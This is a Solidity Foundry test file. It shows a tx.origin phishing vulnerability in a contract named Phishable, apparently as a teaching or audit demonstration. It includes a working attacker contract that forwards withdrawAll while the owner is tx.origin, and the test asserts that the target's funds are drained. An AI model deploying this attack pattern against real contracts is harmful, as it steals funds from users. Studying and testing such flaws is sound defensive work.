// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/phishable.sol";

contract MaliciousContract {
    Phishable target;
    constructor(Phishable _target) payable {
        target = _target;
    }

    function forwardWithdraw() public {
        target.withdrawAll(address(this));
    }

    receive() external payable {}
}

contract PhishableTest is Test {
    Phishable phishable;
    address owner = vm.addr(1); // Generate deterministic EOA
    address attacker = vm.addr(2); // Attackers's EOA
    MaliciousContract malicious;
    
    function setUp() public {
        vm.deal(owner, 10 ether);
        
        // Deploy contract with EOA as owner
        vm.prank(owner);
        phishable = new Phishable(owner);
        
        // Fund target contract
        vm.deal(address(phishable), 5 ether);
        
        // Attacker deploys malicious contract
        vm.prank(attacker);
        malicious = new MaliciousContract(phishable);
    }

    function testTxOriginVulnerability() public {
        console.log("--- BEFORE-Trigger Balances ---");
        uint initialContractBalance = address(phishable).balance;
        uint initialMaliciousBalance = address(malicious).balance;
        console.log("Target contract initial balance: %d", initialContractBalance);
        console.log("Malicious contract initial balance: %d", initialMaliciousBalance);

        console.log("--- Trigger forwardWithdraw ---");
        // Simulate owner (EOA origin) interacting with malicious contract
        vm.prank(owner, owner);
        malicious.forwardWithdraw();

        console.log("--- AFTER-Trigger Balances ---");
        uint afterContractBalance = address(phishable).balance;
        uint afterMaliciousBalance = address(malicious).balance;
        console.log("Target contract current balance: %d", afterContractBalance);
        console.log("Malicious contract current balance: %d", afterMaliciousBalance);

        // Vulnerability exists if funds were fully transferred to attacker
        bool fundsTransferred = (afterContractBalance == 0) && 
                                (afterMaliciousBalance == initialContractBalance);
        
        if (fundsTransferred) {
            console.log("Vulnerability Exists: Contract funds transferred to attacker via tx.origin exploit");
        } else {
            console.log("Vulnerability not Exist: No fund transfer occurred via tx.origin exploit");
        }

        // Original assertions remain
        assertEq(address(phishable).balance, 0, "Contract should be drained");
        assertEq(
            address(malicious).balance,
            initialContractBalance,
            "Malicious contract should have stolen funds"
        );
    }
}